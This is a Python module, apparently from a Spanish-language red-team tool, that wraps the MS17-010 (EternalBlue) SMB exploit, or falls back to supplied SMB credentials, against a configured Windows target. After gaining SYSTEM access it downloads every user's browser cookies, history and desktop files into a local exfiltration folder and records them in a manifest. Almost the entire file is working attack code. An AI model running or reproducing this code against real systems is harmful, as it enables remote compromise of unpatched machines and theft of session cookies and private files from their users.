import os
import sys

sys.path.append(
    os.path.dirname(
        os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
    )
)

from config.settings import OS_CONFIGS, seleccionar_os
from Agentes.Red.Herramientas.ms17_010_checker import check_vulnerability

EXTRACT_DIR = os.path.join(
    os.path.dirname(
        os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
    ),
    "Telemetria",
    "exfil",
)
EXFIL_MANIFEST = os.path.join(EXTRACT_DIR, ".exfil_manifest.txt")


def _write_manifest(files):
    with open(EXFIL_MANIFEST, "w") as f:
        for path in files:
            f.write(path + "\n")


def _download_file(conn, share, remote_path, local_path):
    try:
        os.makedirs(os.path.dirname(local_path), exist_ok=True)
        with open(local_path, "wb") as f:
            conn.getFile(share, remote_path, f.write)
        size = os.path.getsize(local_path)
        print(f"  [\u2705] {remote_path} ({size} bytes)")
        return True, local_path
    except Exception as e:
        print(f"  [\u274c] {remote_path}: {e}")
        return False, None


def _list_users(conn, os_name):
    users = []
    base = "Documents and Settings" if "XP" in os_name else "Users"
    try:
        for entry in conn.listPath("C$", f"{base}\\*"):
            name = entry.get_longname()
            if name not in (
                ".",
                "..",
                "All Users",
                "Default User",
                "Default",
                "LocalService",
                "NetworkService",
                "Public",
            ):
                users.append(name)
    except Exception:
        users.append("Administrator")
    return users


def _user_paths_for_os(os_name):
    cfg = OS_CONFIGS[os_name]
    base = cfg["USER_PATH"]
    return {
        "base": base,
        "cookies": f"{base}\\{cfg['COOKIES_REL']}",
        "history": f"{base}\\{cfg['HISTORY_REL']}",
        "desktop": f"{base}\\{cfg['DESKTOP_REL']}",
    }


def _download_user_data(conn, paths, os_name, smb_user=""):
    print("[*] Extrayendo datos de usuario vía SMB...")
    users = _list_users(conn, os_name)
    if smb_user and smb_user not in users:
        users.append(smb_user)
    print(f"  \u2192 {', '.join(users) if users else 'ninguno'}")

    downloaded = []
    for user in users:
        user_dir = os.path.join(EXTRACT_DIR, "users", user)
        for key in ("cookies", "history", "desktop"):
            base_dir = paths[key]
            remote = base_dir.replace("{user}", user) + "\\*"
            try:
                entries = conn.listPath("C$", remote)
                for entry in entries:
                    name = entry.get_longname()
                    if name in (".", "..") or entry.is_directory():
                        continue
                    ok, local = _download_file(
                        conn,
                        "C$",
                        base_dir.replace("{user}", user) + "\\" + name,
                        os.path.join(user_dir, name),
                    )
                    if ok and local:
                        downloaded.append(f"{user}/{key}/{name}")
            except Exception as e:
                print(f"  [\u274c] {user} | {key}: {e}")

    _write_manifest(downloaded)
    print(f"\n[+] Archivos guardados en: {EXTRACT_DIR} ({len(downloaded)} archivos)")


def _extract_direct(target_ip, smb_user, smb_pass, paths, os_name):
    """Extrae archivos usando credenciales directamente (sin exploit)."""
    from impacket import smbconnection

    print("[*] Conectando vía SMB con credenciales...")
    conn = smbconnection.SMBConnection(target_ip, target_ip)
    conn.login(smb_user, smb_pass)
    _download_user_data(conn, paths, os_name, smb_user)
    conn.logoff()
    return True


def ejecutar_extraccion(os_name=None):
    if os_name is None:
        from config.settings import OS_CHOICE

        os_name = OS_CHOICE

    os_name = seleccionar_os(os_name)
    cfg = OS_CONFIGS[os_name]
    paths = _user_paths_for_os(os_name)
    target_ip = cfg["TARGET_IP"]
    smb_user = cfg["SMB_USER"]
    smb_pass = cfg["SMB_PASS"]
    os.makedirs(EXTRACT_DIR, exist_ok=True)
    print(f"[*] SO: {os_name}")
    print(f"[*] Destino: {EXTRACT_DIR} @ {target_ip}\n")

    # Si hay credenciales, extraer directamente sin exploit
    if smb_user:
        _extract_direct(target_ip, smb_user, smb_pass, paths, os_name)
        print("[✅] Extracción completada.")
        return

    # Sin credenciales: intentar vía MS17-010
    checker = check_vulnerability(target_ip)
    if not checker["vulnerable"]:
        print("[❌] Target no vulnerable.")
        return

    COMMON_PIPES = [
        "spoolss",
        "samr",
        "browser",
        "lsarpc",
        "srvsvc",
        "netlogon",
        "wkssvc",
    ]
    pipe = checker["pipes"][0] if checker["pipes"] else COMMON_PIPES[0]
    if not checker["pipes"]:
        print("[*] Enumeración anónima no disponible. Probando pipes comunes...")
        print(f"[*] Usando pipe por defecto: {pipe}")

    print(f"[+] Target: {checker['target_os']} | Pipe: {pipe}")

    from Agentes.Red.Herramientas import zzz_exploit as _ze

    def _extraction_session(conn, pipe_name, share, mode):
        print("\n[*] Obteniendo acceso SMB como SYSTEM...")
        smb_conn = conn.get_smbconnection()
        print("[*] (Saltando reg save - congela Windows XP)")
        _download_user_data(smb_conn, paths, os_name, smb_user)

    _original = _ze.do_system_mysmb_session
    _ze.do_system_mysmb_session = _extraction_session

    try:
        _ze.exploit(target_ip, 445, smb_user, smb_pass, pipe, "C$", "SHARE")
    except KeyboardInterrupt:
        print("\n[!] Interrumpido.")
    finally:
        _ze.do_system_mysmb_session = _original

    print("[✅] Extracción completada.")


def ejecutar_exploit_sin_exfil(os_name=None):
    if os_name is None:
        from config.settings import OS_CHOICE

        os_name = OS_CHOICE

    os_name = seleccionar_os(os_name)
    cfg = OS_CONFIGS[os_name]
    target_ip = cfg["TARGET_IP"]
    smb_user = cfg["SMB_USER"]
    smb_pass = cfg["SMB_PASS"]

    print(f"[*] SO: {os_name}")
    print(f"[*] Objetivo: {target_ip}")

    checker = check_vulnerability(target_ip)
    if not checker["vulnerable"]:
        print("[❌] Target no vulnerable a MS17-010.")
        return

    pipe = (checker["pipes"] or ["spoolss"])[0]
    print(f"[+] Target vulnerable: {checker['target_os']} | Pipe: {pipe}")

    from Agentes.Red.Herramientas import zzz_exploit as _ze

    def _noop_session(conn, pipe_name, share, mode):
        print("[*] Exploit completado (sin extracción de archivos).")

    _original = _ze.do_system_mysmb_session
    _ze.do_system_mysmb_session = _noop_session

    try:
        _ze.exploit(target_ip, 445, smb_user, smb_pass, pipe, "C$", "SHARE")
    except KeyboardInterrupt:
        print("\n[!] Interrumpido.")
    finally:
        _ze.do_system_mysmb_session = _original

    print("[✅] Exploit MS17-010 completado (sin exfiltración).")
